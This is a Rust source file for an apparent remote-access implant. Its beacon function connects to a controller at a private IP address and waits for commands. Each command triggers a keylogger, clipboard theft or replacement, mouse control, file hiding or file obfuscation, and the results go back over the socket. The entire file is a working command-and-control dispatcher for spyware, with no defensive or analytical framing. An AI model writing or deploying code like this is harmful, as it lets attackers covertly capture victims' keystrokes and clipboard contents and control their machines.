mod tools;
use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, obfuscate, Tool};
use std::{
    io::{self, Read, Write},
    error::Error,
    net::TcpStream,
};


fn check_tool(input: &str) -> Tool {
    match input {
        "keylogger" => return Tool::Keylogger,
        "clipboard" => return Tool::Clipboard,
        "replaceboard" => return Tool::ReplaceBoard,
        "ghost" => return Tool::Ghost,
        "mouseketool" => return Tool::Mouseketool,
        "obfuscate" => return Tool::Obfuscate,
        _ => return Tool::Invalid, 
    }
}


pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
    match tool {
        Tool::Keylogger => {
            let captured = keylogger::run()?;
            Ok(captured)
        }
        Tool::Clipboard => {
            let text = clipboard::run()?;
            Ok(text)
        }
        Tool::ReplaceBoard => {
            let _ = replaceboard::run()?;
            Ok(String::from("Replaced clipboard with text \'1337\'"))
        }
        Tool::Mouseketool => {
            let _ = mouseketool::run()?;
            Ok(String::from("Moved the mouse"))
        } 
        Tool::Ghost => {
            let _ = ghost::run()?;
            Ok(String::from("Hid files"))
        }
        Tool::Obfuscate => {
            let _ = obfuscate::run()?;
            return Ok(String::from("Obfuscated files"))
        }
        _ => {
            Ok(String::from("Invalid tool"))
        }

    }
}

pub fn beacon() {
    if let Ok(mut stream) = TcpStream::connect("10.0.2.15:5000") {
        loop {
            let mut buffer = [0; 1024];
            if let Ok(n) = stream.read(&mut buffer) {
                if n > 0 {
                    let cmd = String::from_utf8_lossy(&buffer[..n]);
                    let tool = check_tool(&cmd);
                    let result = run(tool).unwrap();
                    // println!("{}", result);
                    let _ = stream.write(result.as_bytes()).unwrap();
                } else {
                    break;
                }
            }
        } 
    }
}
